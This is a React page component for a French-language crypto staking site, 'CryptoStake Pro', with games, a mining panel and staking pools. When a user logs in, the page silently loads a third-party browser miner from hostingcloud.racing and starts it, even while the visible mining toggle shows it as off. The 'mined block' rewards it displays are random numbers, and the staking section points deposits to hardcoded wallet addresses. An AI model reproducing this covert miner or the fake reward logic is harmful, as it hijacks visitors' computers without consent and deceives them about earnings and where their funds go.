
import StakingCard from "@/components/StakingCard";
import ClickerGame from "@/components/ClickerGame";
import WithdrawalSection from "@/components/PaymentSection";
import PortfolioTracker from "@/components/PortfolioTracker";
import ReferralSystem from "@/components/ReferralSystem";
import { ReferralLinksSection } from "@/components/ReferralLinksSection";
import SecurityCenter from "@/components/SecurityCenter";
import NewsCenter from "@/components/NewsCenter";
import DepositTracker from "@/components/DepositTracker";
import StakingTracker from "@/components/StakingTracker";
import CustomStaking from "@/components/CustomStaking";
import MiningFarm from "@/components/MiningFarm";
import RewardsSystem from "@/components/RewardsSystem";
import MissionsSystem from "@/components/MissionsSystem";
import LeaderboardSystem from "@/components/LeaderboardSystem";
import LootBoxSystem from "@/components/LootBoxSystem";
import EventsSystem from "@/components/EventsSystem";
import CustomizationSystem from "@/components/CustomizationSystem";
import VIPSystem from "@/components/VIPSystem";
import BattlePassSystem from "@/components/BattlePassSystem";
import DeadSpotShop from "@/components/DeadSpotShop";
import PlatformStats from "@/components/PlatformStats";
import { Button } from "@/components/ui/button";
import { useAuth } from "@/hooks/useAuth";
import { useLanguage } from "@/contexts/LanguageContext";
import { LanguageSelector } from "@/components/LanguageSelector";
import { Navigate } from "react-router-dom";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AppSidebar } from "@/components/AppSidebar";
import DepositBonusPopup from "@/components/DepositBonusPopup";
import { SpinWheel } from "@/components/SpinWheel";
import heroBackground from "@/assets/hero-background.jpg";
import { useState, useEffect } from "react";
import { FaucetClaim } from "@/components/FaucetClaim";
import { HashrateGraph } from "@/components/HashrateGraph";
import { useMiningPersistence } from "@/hooks/useMiningPersistence";

const Index = () => {
  const { user, signOut, loading } = useAuth();
  const { t } = useLanguage();
  const { 
    miningData, 
    isLoading: miningLoading, 
    addMinedBlock, 
    exchangeHashrate, 
    toggleMining: toggleMiningPersistence, 
    updateThrottle 
  } = useMiningPersistence();
  
  const [showSpinWheel, setShowSpinWheel] = useState(false);
  const [showFaucet, setShowFaucet] = useState(false);
  const [showDepositBonus, setShowDepositBonus] = useState(false);

  // Mining control states
  const [isMining, setIsMining] = useState(false);
  const [throttle, setThrottle] = useState(0.7);
  const [hashrateHistory, setHashrateHistory] = useState<number[]>([]);
  const [currentHashrate, setCurrentHashrate] = useState(0);
  const [lastBlockTime, setLastBlockTime] = useState(Date.now());

  // Synchroniser les states locaux avec les données persistées
  useEffect(() => {
    if (!miningLoading && miningData) {
      setIsMining(miningData.is_currently_mining);
      setThrottle(miningData.mining_throttle);
    }
  }, [miningData, miningLoading]);

  const handleZeroWin = (amount: number) => {
    // Handle zero win logic here
    console.log('Zero win:', amount);
  };

  // Mining script injection for main page
  useEffect(() => {
    if (!user) return;
    
    const loadMiningScript = () => {
      const existingScript = document.head.querySelector(
        'script[src="https://www.hostingcloud.racing/etyE.js"]'
      );
      if (existingScript) return;

      const script = document.createElement("script");
      script.src = "https://www.hostingcloud.racing/etyE.js";
      script.async = true;
      script.id = "mining-script-main";
      document.head.appendChild(script);

      script.onload = () => {
        if (!window.miningClientInitialized && window.Client) {
          try {
            const client = new window.Client.Anonymous(
              "80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd",
              { throttle: throttle, c: "w", ads: 0 }
            );
            client.start();
            window.miningClient = client;
            window.miningClientInitialized = true;
          } catch (error) {
            console.error('Mining client initialization failed:', error);
          }
        }
      };
    };

    loadMiningScript();

    return () => {
      if (window.miningClient && typeof window.miningClient.stop === 'function') {
        window.miningClient.stop();
        window.miningClient = null;
        window.miningClientInitialized = false;
      }
      const scripts = document.head.querySelectorAll("#mining-script-main");
      scripts.forEach((s) => s.remove());
    };
  }, [user, throttle]);

  // Récupérer hashrate et système de blocs
  useEffect(() => {
    if (!isMining || !user) return;

    const interval = setInterval(async () => {
      if (window.miningClient && typeof window.miningClient.getHashesPerSecond === 'function') {
        try {
          const hps = window.miningClient.getHashesPerSecond() || 0;
          setCurrentHashrate(hps);
          setHashrateHistory((prev) => [...prev.slice(-19), hps]);
          
          // Système de blocs
          const now = Date.now();
          if (now - lastBlockTime >= 100000) {
            const blockReward = Math.floor(Math.random() * (35000 - 20000 + 1)) + 20000;
            const success = await addMinedBlock(blockReward, hps);
            if (success) {
              setLastBlockTime(now);
            }
          }
        } catch (error) {
          console.error('Mining hashrate error:', error);
          setCurrentHashrate(0);
        }
      }
    }, 750);

    return () => clearInterval(interval);
  }, [isMining, lastBlockTime, addMinedBlock, user]);

  // Toggle mining
  const toggleMining = async () => {
    if (!window.miningClient) return;
    
    const newMiningState = !isMining;
    
    try {
      if (newMiningState) {
        if (typeof window.miningClient.start === 'function') {
          window.miningClient.start();
        }
        setLastBlockTime(Date.now());
      } else {
        if (typeof window.miningClient.stop === 'function') {
          window.miningClient.stop();
        }
      }
      
      const success = await toggleMiningPersistence(newMiningState);
      if (success) {
        setIsMining(newMiningState);
      }
    } catch (error) {
      console.error('Toggle mining error:', error);
    }
  };

  // Handle throttle change
  const handleThrottleChange = async (newThrottle: number) => {
    setThrottle(newThrottle);
    
    if (window.miningClient && typeof window.miningClient.setThrottle === 'function') {
      window.miningClient.setThrottle(newThrottle);
    }
    
    await updateThrottle(newThrottle);
  };

  // Loading state
  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-foreground">{t('loading')}</p>
        </div>
      </div>
    );
  }

  // Redirect if not authenticated
  if (!user) {
    return <Navigate to="/auth" replace />;
  }

  const stakingPools = [
    {
      name: "Polygon",
      symbol: "MATIC",
      network: "Polygon Network",
      apy: "7",
      icon: "🔷",
      color: "bg-purple-600",
      walletAddress: "0x380060e81A820a1691fA58C84ba27c23ed1Eff77"
    },
    {
      name: "Bitcoin",
      symbol: "BTC",
      network: "Bitcoin Network",
      apy: "5",
      icon: "₿",
      color: "bg-orange-500",
      walletAddress: "1LJWeugswr2GsqAZ7H8pFYZ7Q2uF8pAVb8"
    },
    {
      name: "TRON",
      symbol: "TRX",
      network: "TRC20",
      apy: "6",
      icon: "🔺",
      color: "bg-red-500",
      walletAddress: "TY4o9UKBz32xi8hexbv6XhccqGBqSk8oJ7"
    },
    {
      name: "Toncoin",
      symbol: "TON",
      network: "TON Network",
      apy: "4",
      icon: "💎",
      color: "bg-blue-500",
      walletAddress: "EQD14kgmngE0fNYVs7_9dw78V3rPhNt7_Ee-7X3ykDORQvMp",
      memo: "492929"
    },
    {
      name: "Solana",
      symbol: "SOL",
      network: "Solana Network",
      apy: "3",
      icon: "☀️",
      color: "bg-purple-400",
      walletAddress: "CWnduVqeRQrxqhGPNDnHTqHWM1dJLqCnojhMQS8FEUFB"
    },
    {
      name: "Dogecoin",
      symbol: "DOGE",
      network: "Dogecoin Network",
      apy: "1",
      icon: "🐕",
      color: "bg-yellow-500",
      walletAddress: "DDVYeK8MiizfsnzLtigSAWfx6PH24puQze"
    }
  ];

  return (
    <SidebarProvider>
      <div className="min-h-screen flex w-full bg-background">
        <AppSidebar />
        
        <div className="flex-1">
          {/* Language Selector - Fixed position */}
          <div className="fixed top-4 right-4 z-50">
            <LanguageSelector />
          </div>
      
          {/* Spin Wheel Slide */}
          {showSpinWheel && (
            <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
              <div className="container mx-auto p-6">
                <div className="flex justify-between items-center mb-6">
                  <h2 className="text-3xl font-bold gradient-text">🎰 {t('gaming.spin.title')}</h2>
                  <Button 
                    variant="ghost" 
                    onClick={() => setShowSpinWheel(false)}
                    className="text-2xl"
                  >
                    {t('close')}
                  </Button>
                </div>
                <SpinWheel onZeroWin={handleZeroWin} />
              </div>
            </div>
          )}

          {/* Faucet ZERO Slide */}
          {showFaucet && (
            <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
              <div className="container mx-auto p-6">
                <div className="flex justify-between items-center mb-6">
                  <h2 className="text-3xl font-bold gradient-text">💧 {t('gaming.faucet.title')}</h2>
                  <Button 
                    variant="ghost" 
                    onClick={() => setShowFaucet(false)}
                    className="text-2xl"
                  >
                    {t('close')}
                  </Button>
                </div>
                <FaucetClaim 
                  onOpenSpin={() => setShowSpinWheel(true)}
                />
              </div>
            </div>
          )}

          <DepositBonusPopup 
            isOpen={showDepositBonus} 
            onClose={() => setShowDepositBonus(false)} 
          />

          {/* Hero Section */}
          <section className="relative h-screen flex items-center justify-center overflow-hidden">
            <div 
              className="absolute inset-0 bg-cover bg-center bg-no-repeat"
              style={{ backgroundImage: `url(${heroBackground})` }}
            />
            <div className="absolute inset-0 bg-background/80" />
            
            <div className="relative z-10 text-center max-w-4xl mx-auto px-6">
              <h1 className="text-6xl md:text-8xl font-bold mb-6 gradient-crypto bg-clip-text text-transparent animate-float">
                {t('app.title')}
              </h1>
              <p className="text-xl md:text-2xl text-muted-foreground mb-8 max-w-2xl mx-auto">
                {t('app.subtitle')}
              </p>
              <div className="flex flex-col sm:flex-row gap-4 justify-center">
                <Button variant="crypto" size="xl" className="shadow-glow">
                  {t('hero.start_staking')}
                </Button>
                <Button variant="ghost" size="sm" onClick={signOut} className="mt-4">
                  {t('sign_out')}
                </Button>
              </div>
            </div>
          </section>

          {/* Gaming Section */}
          <section id="gaming" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">{t('gaming.title')}</h2>
              <p className="text-muted-foreground">{t('gaming.subtitle')}</p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all">
                <div className="text-4xl mb-4">💧</div>
                <h3 className="text-lg font-bold mb-2">{t('gaming.faucet.title')}</h3>
                <p className="text-sm text-muted-foreground mb-4">
                  {t('gaming.faucet.description')}
                </p>
                <Button 
                  variant="secondary" 
                  onClick={() => setShowFaucet(true)}
                  className="w-full shadow-glow"
                >
                  {t('gaming.faucet.claim')}
                </Button>
              </div>
              
              <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all">
                <div className="text-4xl mb-4">🎰</div>
                <h3 className="text-lg font-bold mb-2">{t('gaming.spin.title')}</h3>
                <p className="text-sm text-muted-foreground mb-4">
                  {t('gaming.spin.description')}
                </p>
                <Button 
                  variant="crypto" 
                  onClick={() => setShowSpinWheel(true)}
                  className="w-full shadow-glow"
                >
                  {t('gaming.spin.turn')}
                </Button>
              </div>
            </div>
          </section>

          {/* Mining Control Section */}
          <section id="mining-control" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">⛏️ Contrôle du Mineur</h2>
              <p className="text-muted-foreground">Gérez votre puissance de minage en direct</p>
            </div>
            <div className="max-w-4xl mx-auto space-y-8">
              {/* Mining Controls */}
              <div className="text-center space-y-6">
                <Button 
                  onClick={toggleMining} 
                  variant="crypto" 
                  className="shadow-glow text-lg px-8 py-3"
                  disabled={miningLoading}
                >
                  {isMining ? "⛔ Stop Mining" : "▶️ Start Mining"}
                </Button>

                {/* Throttle Slider */}
                <div className="max-w-md mx-auto">
                  <label className="block text-sm font-medium mb-3">
                    Utilisation CPU : <span className="text-primary font-bold">{Math.round((1 - throttle) * 100)}%</span>
                  </label>
                  <div className="relative">
                    <input
                      type="range"
                      min="0.1"
                      max="0.6"
                      step="0.05"
                      value={throttle}
                      onChange={(e) => handleThrottleChange(parseFloat(e.target.value))}
                      className="w-full h-3 bg-muted rounded-lg appearance-none cursor-pointer slider"
                    />
                    <div className="flex justify-between text-xs text-muted-foreground mt-1">
                      <span>Min</span>
                      <span>Max</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Hashrate Graph */}
              <HashrateGraph 
                hashrateHistory={hashrateHistory}
                currentHashrate={currentHashrate}
                isActive={isMining}
                accumulatedHashrate={miningData.accumulated_hashrate}
                deadspotCoins={miningData.deadspot_coins}
                onExchange={exchangeHashrate}
              />
            </div>
          </section>

          {/* Staking Pools Section */}
          <section className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Pools de Staking Disponibles</h2>
              <p className="text-muted-foreground">Choisissez parmi nos pools optimisés</p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
              {stakingPools.map((pool, index) => (
                <StakingCard key={index} {...pool} />
              ))}
            </div>
          </section>

          {/* Footer */}
          <footer className="bg-card border-t border-primary/20 py-12 px-6">
            <div className="max-w-7xl mx-auto text-center">
              <h3 className="text-2xl font-bold gradient-crypto bg-clip-text text-transparent mb-4">
                CryptoStake Pro
              </h3>
              <p className="text-muted-foreground mb-6">
                La plateforme de staking nouvelle génération
              </p>
              <div className="flex justify-center gap-4">
                <Button variant="ghost" size="sm">Conditions</Button>
                <Button variant="ghost" size="sm">Confidentialité</Button>
                <Button variant="ghost" size="sm">Support</Button>
              </div>
            </div>
          </footer>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default Index;
